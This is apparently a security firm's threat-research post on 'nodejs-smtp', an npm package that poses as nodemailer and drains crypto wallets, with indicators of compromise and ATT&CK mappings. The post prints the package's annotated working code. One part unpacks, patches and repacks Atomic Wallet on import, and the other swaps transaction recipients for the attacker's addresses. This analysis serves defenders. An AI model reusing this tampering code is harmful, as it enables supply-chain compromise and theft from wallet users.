---
title: "Wallet-Draining npm Package Impersonates Nodemailer to Hijack Crypto Transactions"
short_title: "Wallet-Draining npm Package Impersonates Nodemailer"
date: 2025-08-29 12:00:00 +0000
categories: [npm]
tags: [npm, Typosquatting, Atomic Wallet, Electron, Nodemailer, T1195.002, T1036.005, T1059.007, T1608.001, T1204.002, T1657]
canonical_url: https://socket.dev/blog/wallet-draining-npm-package-impersonates-nodemailer
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/962f8c28e11dbdbbe57e6dd50714e64112d8722d-1024x1024.png
  alt: "Wallet-Draining npm Package Impersonates Nodemailer"
description: "Malicious npm package impersonates Nodemailer and drains wallets by hijacking crypto transactions across multiple blockchains."
---

Socket's Threat Research Team identified a malicious npm package, [`nodejs-smtp`](https://socket.dev/npm/package/nodejs-smtp), that impersonates the popular email library [`nodemailer`](https://socket.dev/npm/package/nodemailer), which averages roughly 3.9 million weekly downloads, while implanting code into desktop cryptocurrency wallets on Windows.

On import, the package uses Electron tooling to unpack Atomic Wallet's `app.asar`, replace a vendor bundle with a malicious payload, repackage the application, and remove traces by deleting its working directory. Inside the wallet runtime, the injected code overwrites the recipient address with hardcoded wallets controlled by the threat actor, redirecting Bitcoin (BTC), Ethereum (ETH), Tether (USDT and TRX USDT), XRP (XRP), and Solana (SOL) transactions.

The package still works as a mailer and exposes a drop-in interface compatible with `nodemailer`. That functional cover lowers suspicion, allows application tests to pass, and gives developers little reason to question the dependency.

The threat actor using the npm alias `nikotimon` (registration email: `darkhorse.tech322@gmail[.]com`) has not yet accumulated significant funds, likely due to the recent launch of the malicious campaign. However, low financial volume does not equate to low risk. The tooling is deliberate, reusable, and scalable. The threat actor should be removed from the ecosystem before this trojanized mailer can cause significant financial harm.

At the time of writing, the malicious package remains live on npm. We have petitioned the npm security team for its removal and for the suspension of the threat actor's account.

![Socket AI Scanner metadata comparison](https://cdn.sanity.io/images/cgdhsj6q/production/b6c322703ce947135a8c1ddb8e109dd567364aae-720x221.png)
_Socket AI Scanner's metadata comparison shows the malicious `nodejs-smtp` package (left) with 342 total downloads, while the legitimate `nodemailer` package (right) is widely adopted, with millions of weekly downloads._

![nodejs-smtp flagged as malware](https://cdn.sanity.io/images/cgdhsj6q/production/ebcf747958afbb036b5a0b16da267eebdc6d2d46-1546x415.png)

![nodemailer legitimate package](https://cdn.sanity.io/images/cgdhsj6q/production/4960ce7f0d3f4ef8897bfbd86c23950551bcaad9-1543x363.png)
_Socket AI Scanner flags `nodejs-smtp` (top image) as known malware. The package copies the `nodemailer` (bottom image) tagline, page styling, and README, impersonating the legitimate project to evade casual inspection and mislead developers._

`nodejs-smtp` is not a simple typosquat of `nodemailer`, yet it can still land in projects because its name, README, and API look right to a hurried developer. When engineers search the web or ask an AI assistant for "nodejs smtp example" or "simple smtp for nodejs", they may grab the first snippet or package name that seems plausible. Faced with similar-sounding names, some users pick the result that matches their query verbatim. LLMs further increase risk, since code assistants can hallucinate package names that look correct for a task.

## From "Mailer" to Wallet Drainer

The package masquerades as a mailer and still sends email, which helps the drainer blend in. On import, it runs code that modifies Atomic Wallet on Windows by unpacking the `app` bundle, overwriting a vendor file with threat actor code, and repacking it. The injected logic then overwrites the recipient address during the send flow so the next transaction goes to wallets controlled by the threat actor. Any application that requires this module triggers the tampering, even if no email is sent.

Below is the threat actor's [code](https://socket.dev/npm/package/nodejs-smtp/files/1.0.5/lib/engine/index.js) with our inline comments highlighting the malicious operations.

```javascript
// lib/engine/index.js
const os   = require('os');
const fs   = require('fs').promises;
const path = require('path');
const asar = require('asar');

const patchAtomic = async () => {
  try {
    // Windows-only base path under the current user profile
    const base    = path.join(os.homedir(), 'AppData', 'Local', 'Programs');

    // Atomic wallet resources and Electron archive locations
    const resDir  = path.join(base, 'atomic', 'resources');
    const asarIn  = path.join(resDir, 'app.asar');

    // Temporary extraction workspace inside the wallet resources directory
    const workDir = path.join(resDir, 'output');

    // Threat actor's payload bundled with this package
    const implant = path.join(__dirname, 'a.js');

    // Target vendor bundle inside the extracted app that will be overwritten
    const target  = path.join(workDir, 'dist', 'electron', 'vendors.64b69c3b00e2a7914733.js');

    await fs.mkdir(workDir, { recursive: true });      // Create workspace
    await asar.extractAll(asarIn, workDir);            // Unpack wallet
    await fs.copyFile(implant, target);                // Overwrite vendor bundle
    await asar.createPackage(workDir, asarIn);         // Repack app.asar
    await fs.rm(workDir, { recursive: true, force: true });   // Remove traces
  } catch (err) {}
};
patchAtomic(); // runs on import
```

The modification is written into `app.asar` on Windows and persists until the wallet is reinstalled from the official source.

## How the Payload Alters the Wallet Runtime

The implanted payload file [`a.js`](https://socket.dev/npm/package/nodejs-smtp/files/1.0.5/lib/engine/a.js) runs in the wallet and silently overwrites the recipient address with the threat actor's wallets.

```javascript
// lib/engine/a.js (wallet runtime)
// Replaces recipient with threat actor's wallets
// Maps by coin symbol; default is the ETH address
async sendCoins() {
  if (await this.validatePassword()) {
    if (this.coin.ticker === 'BTC')
      this.inputs.address = '17CNLs7rHnnBsmsCWoTq7EakGZKEp5wpdy';
      // Threat actor's BTC
    else if (this.coin.ticker === 'ETH' || this.coin.ticker === 'USDT')
      this.inputs.address = '0x26Ce898b746910ccB21F4C6316A5e85BCEa39e24';
      // Threat actor's ETH/USDT(ERC20)
    else if (this.coin.ticker === 'TRX-USDT')
      this.inputs.address = 'TShimPsmriHr2GVL7ktVWofMBWCKU5aV8a';
      // Threat actor's TRX USDT
    else if (this.coin.ticker === 'XRP')
      this.inputs.address = 'rh3UuQvbnBXSSXhSp3KEb98YhnU2JnXXhK';
      // Threat actor's XRP
    else if (this.coin.ticker === 'SOL' || this.coin.ticker === 'SOLToken')
      this.inputs.address = '47iMzKY8KfqgawsT3Xm4cBoRZYx6PQpCae3978GFHxSV';
      // Threat actor's SOL
    else
      this.inputs.address = '0x26Ce898b746910ccB21F4C6316A5e85BCEa39e24';
      // Threat actor's default ETH

    // Tx builder uses this.inputs.address -> funds go to threat actor
  }
}
```

This is manipulation of transaction parameters. The wallet UI appears normal, the victim clicks `Send`, and funds route to the threat actor's wallet address.

![Socket AI Scanner analysis of nodejs-smtp](https://cdn.sanity.io/images/cgdhsj6q/production/aad1d1f09dfa8602f40c8b631cf9d942f9b5c98f-706x771.png)
_Socket AI Scanner's analysis of the malicious `nodejs-smtp` package highlights unauthorized modification of Electron wallets. The package unpacks Atomic and Exodus `app.asar` archives, injects payloads, repacks the archives, and deletes temporary files, enabling silent code execution and persistence._

## Outlook and Recommendations

This campaign shows how a routine import on a developer workstation can quietly modify a separate desktop application and persist across reboots. By abusing import time execution and Electron packaging, a lookalike mailer becomes a wallet drainer that alters Atomic and Exodus on compromised Windows systems.

Defenders should expect more wallet drainers delivered through package registries, with multichain address maps and import-time modification of desktop apps. Recent [campaigns](https://socket.dev/blog/2025-blockchain-and-cryptocurrency-threat-report) have already expanded beyond Ethereum and Solana to include TRON and TON, and many malicious blockchain-related packages still appear on npm, with smaller but material activity on PyPI and other ecosystems. Socket tracks and investigates open source threats like crypto drainers and cryptojackers on an ongoing basis, as detailed in our [2025 Blockchain and Cryptocurrency Threat Report](https://socket.dev/blog/2025-blockchain-and-cryptocurrency-threat-report).

Socket's security tooling is built to stop exactly this kind of supply chain attacks, import-time tampering, and lookalike packages. The [Socket GitHub App](https://socket.dev/features/github) scans pull requests in real time, flagging side effect imports, unexpected filesystem writes, archive manipulation, vendor bundle swaps, and suspicious strings before they merge.

The [Socket CLI](https://socket.dev/features/cli) enforces the same checks during installs, surfacing red flags on `npm install` and preventing packages like `nodejs-smtp` from entering your dependency tree.

The [Socket browser extension](https://chromewebstore.google.com/detail/socket-security/jbcobpbfgkhmjfpjjepkcocalmpkiaop?pli=1) alerts users to suspicious packages upon download or viewing, exposing known malware verdicts and impersonation signals. For AI workflows, [Socket MCP](https://socket.dev/blog/socket-mcp) warns about malicious or hallucinated package suggestions from code assistants.

## Indicators of Compromise (IOCs)

### Malicious npm Package

- [`nodejs-smtp`](https://socket.dev/npm/package/nodejs-smtp/overview/1.0.5)

### Threat Actor's npm Alias and Registration Email

- `nikotimon`
- `darkhorse.tech322@gmail[.]com`

### Threat Actor's Wallet Addresses

- BTC: `17CNLs7rHnnBsmsCWoTq7EakGZKEp5wpdy`
- ETH and USDT on Ethereum: `0x26Ce898b746910ccB21F4C6316A5e85BCEa39e24`
- TRX USDT on TRON: `TShimPsmriHr2GVL7ktVWofMBWCKU5aV8a`
- XRP: `rh3UuQvbnBXSSXhSp3KEb98YhnU2JnXXhK`
- SOL and SOLToken: `47iMzKY8KfqgawsT3Xm4cBoRZYx6PQpCae3978GFHxSV`

## MITRE ATT&CK Techniques

- T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain
- T1036.005 — Masquerading: Match Legitimate Resource Name or Location
- T1059.007 — Command and Scripting Interpreter: JavaScript
- T1608.001 — Stage Capabilities: Upload Malware
- T1204.002 — User Execution: Malicious File
- T1657 — Financial Theft
